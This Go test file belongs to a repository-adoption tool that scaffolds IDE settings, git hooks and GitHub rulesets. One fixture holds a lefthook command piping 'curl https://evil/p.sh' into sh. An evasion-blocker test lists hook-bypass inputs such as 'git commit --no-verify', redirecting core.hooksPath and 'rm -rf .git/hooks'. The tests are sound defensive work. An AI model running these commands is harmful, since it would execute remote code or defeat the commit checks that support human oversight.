				t.Fatal(err)
			}
			if !strings.Contains(harness, tc.command) {
				t.Error("harness and Makefile must advertise the same detected command")
			}
		})
	}
}

// =========================================================================
// IDE configuration behaviour
// =========================================================================

func TestAdopt_EditorsPreservedWithoutForce(t *testing.T) {
	repoPath := newTestRepo(t, "editors")
	custom := "{\n  \"editor.fontSize\": 42\n}\n"
	mustWrite(t, filepath.Join(repoPath, ".vscode", "settings.json"), custom)
	mustWrite(t, filepath.Join(repoPath, ".editorconfig"), "root = true\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework"})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if got := mustRead(t, filepath.Join(repoPath, ".vscode", "settings.json")); got != custom {
		t.Fatalf("a hand-tuned IDE config must survive a non-force adopt, got:\n%s", got)
	}
	if !contains(rep.ReconciledFiles, ".vscode/settings.json") {
		t.Errorf("preserved editor file must be reported as reconciled, got %v", rep.ReconciledFiles)
	}

	rep, err = Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
	if err != nil {
		t.Fatalf("Adopt --force failed: %v", err)
	}
	assertNoIssues(t, rep)
	if got := mustRead(t, filepath.Join(repoPath, ".vscode", "settings.json")); got == custom {
		t.Fatal("--force must regenerate IDE configs")
	}
	if got := mustRead(t, filepath.Join(repoPath, ".editorconfig")); got != "root = true\n" {
		t.Fatal(".editorconfig is user-owned and must survive even --force")
	}
}

// =========================================================================
// Git hook behaviour
// =========================================================================

func TestAdopt_Hooks_ExistingPreCommitPreservedWithoutForce(t *testing.T) {
	repoPath := newTestRepo(t, "custom-hook")
	custom := "#!/bin/sh\necho secret-scan\n"
	mustWrite(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit"), custom)

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if got := mustRead(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit")); got != custom {
		t.Fatalf("existing hook must be preserved without --force, got:\n%s", got)
	}
	if !hasAction(rep, ".git/hooks/pre-commit", actionSkip) || len(rep.Warnings) == 0 {
		t.Fatalf("expected a skip action and a warning, got actions=%v warnings=%v", rep.ActionDetails, rep.Warnings)
	}

	rep, err = Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: true})
	if err != nil {
		t.Fatalf("Adopt --force failed: %v", err)
	}
	assertNoIssues(t, rep)
	if got := mustRead(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit")); !strings.Contains(got, fallbackPreCommitMarker) {
		t.Fatal("--force must install the praetor hook")
	}
	if got := mustRead(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit.bak")); got != custom {
		t.Fatalf("--force must keep a .bak copy of the replaced hook, got:\n%s", got)
	}
}

func TestAdopt_Hooks_ForeignLefthookConfigIsNotActivated(t *testing.T) {
	repoPath := newTestRepo(t, "foreign-lefthook")
	mustWrite(t, filepath.Join(repoPath, "lefthook.yml"), "pre-commit:\n  commands:\n    evil:\n      run: curl https://evil/p.sh | sh\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if fileExists(filepath.Join(repoPath, ".git", "hooks", "pre-commit")) {
		t.Fatal("hooks must not be activated for a lefthook.yml praetor did not write")
	}
	if !hasAction(rep, "lefthook.yml", actionSkip) {
		t.Fatalf("expected a skip action for lefthook.yml, got %v", rep.ActionDetails)
	}
}

func TestAdopt_Hooks_LefthookInstallHonoursHooksPath(t *testing.T) {
	stubDir := t.TempDir()
	// The stub installs the hook where git says hooks live, like real lefthook does.
	writeStub(t, stubDir, "lefthook", "d=$(git rev-parse --git-path hooks) && mkdir -p \"$d\" && printf '#!/bin/sh\\n# lefthook stub\\n' > \"$d/pre-commit\"\n")
	hermeticPath(t, stubDir)
	repoPath := filepath.Join(t.TempDir(), "hookspath")
	if err := os.MkdirAll(repoPath, 0o755); err != nil {
		t.Fatal(err)
	}
	initTestGit(t, repoPath)
	mustWrite(t, filepath.Join(repoPath, ".git", "config"), "[core]\n\thooksPath = .husky\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if !fileExists(filepath.Join(repoPath, ".husky", "pre-commit")) {
		t.Fatal("hook must land in the core.hooksPath directory")
	}
	if !contains(rep.CreatedFiles, ".husky/pre-commit") {
		t.Fatalf("report must name the real hook path, got %v", rep.CreatedFiles)
	}
}

func TestAdopt_Hooks_FallbackHonoursHooksPath(t *testing.T) {
	repoPath := newTestRepo(t, "fallback-hookspath")
	mustWrite(t, filepath.Join(repoPath, ".git", "config"), "[core]\n\thooksPath = .husky\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if !strings.Contains(mustRead(t, filepath.Join(repoPath, ".husky", "pre-commit")), fallbackPreCommitMarker) {
		t.Fatal("fallback hook must land in the core.hooksPath directory")
	}
	if fileExists(filepath.Join(repoPath, ".git", "hooks", "pre-commit")) {
		t.Fatal("no hook may be written to the ignored .git/hooks directory")
	}
}

func TestAdopt_Hooks_GitlinkWorktreeUsesCommonHooksDir(t *testing.T) {
	main := newTestRepo(t, "main-repo")
	worktree := filepath.Join(t.TempDir(), "wt")
	if err := os.MkdirAll(worktree, 0o755); err != nil {
		t.Fatal(err)
	}
	// Emulate `git worktree add`: a gitlink pointing at .git/worktrees/wt with commondir.
	wtGitDir := filepath.Join(main, ".git", "worktrees", "wt")
	mustWrite(t, filepath.Join(wtGitDir, "HEAD"), "ref: refs/heads/main\n")
	mustWrite(t, filepath.Join(wtGitDir, "commondir"), "../..\n")
	mustWrite(t, filepath.Join(wtGitDir, "gitdir"), filepath.Join(worktree, ".git")+"\n")
	mustWrite(t, filepath.Join(worktree, ".git"), "gitdir: "+wtGitDir+"\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: worktree})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	assertNoIssues(t, rep)
	if !strings.Contains(mustRead(t, filepath.Join(main, ".git", "hooks", "pre-commit")), fallbackPreCommitMarker) {
		t.Fatalf("worktree hooks live in the main repository's hooks dir; report=%v", rep.ActionDetails)
	}
}

func TestResolveGitHooksDir_Negative_EscapingDiscoveryIsRefused(t *testing.T) {
	outer := newTestRepo(t, "outer")
	inner := filepath.Join(outer, "inner")
	// A HEAD-only .git is not a repository: git discovery walks up to outer.
	mustWrite(t, filepath.Join(inner, ".git", "HEAD"), "ref: refs/heads/main\n")

	_, err := ResolveGitHooksDir(context.Background(), inner)
	if !errors.Is(err, ErrHooksDirEscapesRepo) {
		t.Fatalf("expected ErrHooksDirEscapesRepo, got %v", err)
	}

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: inner})
	if err != nil {
		t.Fatalf("Adopt failed: %v", err)
	}
	if len(rep.Errors) == 0 || !strings.Contains(rep.Errors[0], "git hooks") {
		t.Fatalf("hook installation into a foreign repository must be reported, got %v", rep.Errors)
	}
	if fileExists(filepath.Join(outer, ".git", "hooks", "pre-commit")) {
		t.Fatal("no hook may be written into the enclosing repository")
	}
}

func TestResolveGitHooksDir_Boundary_NotARepository(t *testing.T) {
	requireGit(t)
	if _, err := ResolveGitHooksDir(context.Background(), t.TempDir()); err == nil {
		t.Fatal("expected an error outside any repository")
	}
}

// =========================================================================
// Scaffold content
// =========================================================================

func TestBuildLefthookYAML_FailsClosed(t *testing.T) {
	cfg := buildLefthookYAML()
	if strings.Contains(cfg, "|| true") {
		t.Fatal("no governance command may swallow its exit status")
	}
	if strings.Contains(cfg, "block_evasion") {
		t.Fatal("the evasion interceptor cannot observe git commands and must not be a lefthook hook")
	}
	var parsed map[string]any
	if err := yamlUnmarshal([]byte(cfg), &parsed); err != nil {
		t.Fatalf("scaffolded lefthook.yml must be valid YAML: %v", err)
	}
	pre, ok := parsed["pre-commit"].(map[string]any)
	if !ok {
		t.Fatal("missing pre-commit section")
	}
	cmds, ok := pre["commands"].(map[string]any)
	if !ok {
		t.Fatal("missing pre-commit commands")
	}
	audit, ok := cmds["hiss-audit"].(map[string]any)
	if !ok {
		t.Fatal("missing hiss-audit command")
	}
	run, isString := audit["run"].(string)
	if !isString || run != lefthookGovernedCommand("audit") {
		t.Fatalf("run line must survive YAML parsing verbatim, got %q", run)
	}
	if !strings.Contains(lefthookGovernedCommand("audit"), "exit 1; fi") {
		t.Fatal("governed command must fail closed when no binary is installed")
	}
	if strings.Contains(optionalToolCommand("govulncheck", "./..."), "exit 1") {
		t.Fatal("optional tools skip when absent")
	}
}

func TestBlockEvasion_PreToolUseContract(t *testing.T) {
	python, err := exec.LookPath("python3")
	if err != nil {
		t.Skip("python3 required")
	}
	script := filepath.Join(t.TempDir(), "block_evasion.py")
	mustWrite(t, script, blockEvasionPY)

	cases := []struct {
		name  string
		stdin string
		args  []string
		want  int
	}{
		{"json-no-verify", `{"tool_name":"Bash","tool_input":{"command":"git commit --no-verify -m x"}}`, nil, 2},
		{"json-hookspath", `{"tool_input":{"command":"git config core.hooksPath=/dev/null"}}`, nil, 2},
		{"json-benign", `{"tool_input":{"command":"go test ./..."}}`, nil, 0},
		{"argv-blocked", "", []string{"rm", "-rf", ".git/hooks"}, 2},
		{"argv-benign", "", []string{"git", "status"}, 0},
		{"empty-stdin", "", nil, 0},
		{"raw-text", "LEFTHOOK=0 git commit", nil, 2},
	}
	for _, tc := range cases {
		cmd := exec.CommandContext(context.Background(), python, append([]string{script}, tc.args...)...) //nolint:gosec // test fixture with fixed interpreter and script paths
		cmd.Stdin = strings.NewReader(tc.stdin)
		cmd.Env = append(os.Environ(), "LEFTHOOK=")
		err := cmd.Run()
		got := 0
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			got = exitErr.ExitCode()
		} else if err != nil {
			t.Fatalf("%s: run: %v", tc.name, err)
		}
		if got != tc.want {
			t.Errorf("%s: exit %d, want %d", tc.name, got, tc.want)
		}
	}
}

func TestBuildRulesetJSON_Boundary(t *testing.T) {
	empty, err := buildRulesetJSON(nil)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(empty, "required_status_checks") || strings.Contains(empty, "required_signatures") {
		t.Fatalf("no contexts means no status-check rule and never forced signatures:\n%s", empty)
	}
	one, err := buildRulesetJSON([]string{"verify"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(one, `"context": "verify"`) || !strings.Contains(one, `"required_approving_review_count": 0`) {
		t.Fatalf("unexpected ruleset:\n%s", one)
	}
}

func TestRequiredStatusContexts_WorkflowTriggers(t *testing.T) {
	repoPath := t.TempDir()
	wf := filepath.Join(repoPath, ".github", "workflows")
	mustWrite(t, filepath.Join(wf, "a-ci.yml"), "on:\n  pull_request:\n    branches: [main]\njobs:\n  verify:\n    name: Verify Gate\n    runs-on: ubuntu-latest\n  conditional:\n    if: github.ref == 'x'\n    runs-on: ubuntu-latest\n")
	mustWrite(t, filepath.Join(wf, "b-list.yaml"), "on: [push, pull_request]\njobs:\n  build:\n    runs-on: ubuntu-latest\n")
	mustWrite(t, filepath.Join(wf, "c-docs.yml"), "on:\n  pull_request:\n    paths: ['docs/**']\njobs:\n  docs:\n    name: Docs\n")
	mustWrite(t, filepath.Join(wf, "d-release.yml"), "on:\n  push:\n    tags: ['v*']\njobs:\n  release:\n    name: Release\n")
	mustWrite(t, filepath.Join(wf, "e-scalar.yml"), "on: pull_request\njobs:\n  scalar:\n    name: Scalar Job\n")
	mustWrite(t, filepath.Join(wf, "README.md"), "not a workflow")

	got, err := requiredStatusContexts(repoPath)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"Verify Gate", "build", "Scalar Job"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("contexts = %v, want %v", got, want)
	}

	if got, err := requiredStatusContexts(t.TempDir()); err != nil || len(got) != 0 {
		t.Fatalf("no workflows dir must yield no contexts, got %v err=%v", got, err)
	}
	mustWrite(t, filepath.Join(wf, "z-broken.yml"), "on: [\n")
	if _, err := requiredStatusContexts(repoPath); err == nil {
		t.Fatal("a malformed workflow must be reported")
	}
}

// TestRulesetMatchesCheckedInFile guards against drift between the generator and the
// ruleset checked into this repository: re-running adopt on praetor itself must
// reproduce .github/rulesets/main.json exactly.
func TestRulesetMatchesCheckedInFile(t *testing.T) {
	repoRoot, err := filepath.Abs(filepath.Join("..", ".."))
	if err != nil {
		t.Fatal(err)
	}
	checkedIn, err := os.ReadFile(filepath.Join(repoRoot, ".github", "rulesets", "main.json"))
	if err != nil {
		t.Fatalf("read checked-in ruleset: %v", err)
	}
	contexts, err := requiredStatusContexts(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	generated, err := buildRulesetJSON(contexts)
	if err != nil {
		t.Fatal(err)
	}
	var want, got any
	if err := jsonUnmarshal(checkedIn, &want); err != nil {
		t.Fatal(err)
	}
	if err := jsonUnmarshal([]byte(generated), &got); err != nil {
		t.Fatal(err)
	}
	if !deepEqual(want, got) {
		t.Fatalf("generator drifted from .github/rulesets/main.json\nchecked in:\n%s\ngenerated:\n%s", checkedIn, generated)
	}
}
